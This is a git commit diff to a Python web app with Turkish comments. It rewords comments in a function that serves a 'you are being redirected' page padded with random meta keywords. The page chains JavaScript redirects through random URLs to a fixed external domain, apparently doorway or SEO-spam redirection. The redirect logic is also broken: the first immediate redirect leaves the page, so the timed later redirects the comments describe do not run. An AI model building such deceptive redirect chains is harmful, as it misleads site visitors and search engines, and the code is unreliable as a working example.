c3f63b79a5ac0c3e2e827b56e3bd836369983248
TheTahref <seninemailin@gmail.com>
2025-04-08 16:22:16 +0300

    Güncellenmiş yönlendirme kodu eklendi

--- app.py
+++ app.py
@@ -31,7 +31,7 @@ def redirect_sequence():
     description = get_random_words(8)
     keywords = ', '.join(random.sample(random_sites, 5))
 
-    # İlk yönlendirme JavaScript ile yapıyoruz
+    # İlk yönlendirmeyi JavaScript ile yapıyoruz
     return f"""
     <html>
         <head>
@@ -42,15 +42,15 @@ def redirect_sequence():
         <body>
             <p>Yönlendiriliyorsunuz...</p>
             <script>
-                // İlk yönlendirme: İlk siteye git
+                // İlk yönlendirme
                 window.location.replace('{random_url1}');
 
-                // 2. Yönlendirme: İlk yönlendirme tamamlandıktan sonra, hemen 2. siteye yönlendir
+                // 1 saniye sonra ikinci siteye yönlendir
                 setTimeout(function() {{
                     window.location.replace('{random_url2}');
-                }}, 1000);  // 1 saniye sonra 2. siteye yönlendir
+                }}, 1000);  // 1 saniye sonra ikinci siteye yönlendir
 
-                // 3. Yönlendirme: İkinci site tamamlandıktan sonra, 5 saniye bekleyip, nihai siteye yönlendir
+                // 5 saniye sonra nihai siteye yönlendir
                 setTimeout(function() {{
                     window.location.replace('https://istanbul.sugarturkey.online/');
                 }}, 5000);  // 5 saniye sonra nihai siteye yönlendir
